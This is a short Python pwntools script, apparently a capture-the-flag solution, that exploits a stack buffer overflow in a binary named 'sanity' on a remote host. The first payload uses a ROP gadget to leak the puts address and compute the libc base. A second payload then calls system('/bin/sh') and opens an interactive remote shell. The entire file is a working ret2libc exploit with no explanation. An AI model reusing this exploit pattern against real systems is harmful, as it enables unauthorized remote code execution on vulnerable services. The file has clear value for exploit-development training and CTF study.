from pwn import *

#p = process("./sanity")
p = remote("35.185.151.73",8044)

libc = ELF("./libc-2.23.so") 
e = ELF('./sanity')

libc_system_off = libc.symbols['system']
libc_puts_off = libc.symbols['puts']
libc_binsh_offset = next(libc.search('/bin/sh'))
gadget = 0x4006a3

info("libc system offset: " + hex(libc_system_off))
info("libc /bin/sh offset: " + hex(libc_binsh_offset))
info("libc puts offset: " + hex(libc_puts_off))

payload = "a"*(0x70+8)
payload += p64(gadget)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['main'])

p.recvuntil("Sanity Check should be easy\n")
p.sendline(payload)

leaked = p.recvuntil("\n")
leaked = u64(leaked[:-1].ljust(8,'\x00'))
libc_base_addr = leaked - libc_puts_off

info("leaked puts: " + hex(leaked))
info("libc base: " + hex(libc_base_addr))

p.recvuntil("\n")
payload = "a"*(0x70+8)
payload += p64(gadget)
payload += p64(libc_base_addr + libc_binsh_offset)
payload += p64(libc_base_addr + libc_system_off)

p.sendline(payload)
p.interactive()